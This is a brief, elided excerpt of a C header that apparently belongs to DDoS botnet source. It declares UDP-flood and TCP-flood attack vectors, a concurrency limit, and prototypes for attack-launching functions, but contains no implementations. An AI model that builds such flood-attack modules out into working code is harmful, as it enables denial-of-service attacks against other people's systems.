...
#define ATTACK_CONCURRENT_MAX   2
...
#define ATK_VEC_UDPFLOOD   0
#define ATK_VEC_TCPFLOOD   1
...
void attack_start(int, int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
...
/* Actual attacks */
void attack_udp_flood(uint32_t, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_flood(uint32_t, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
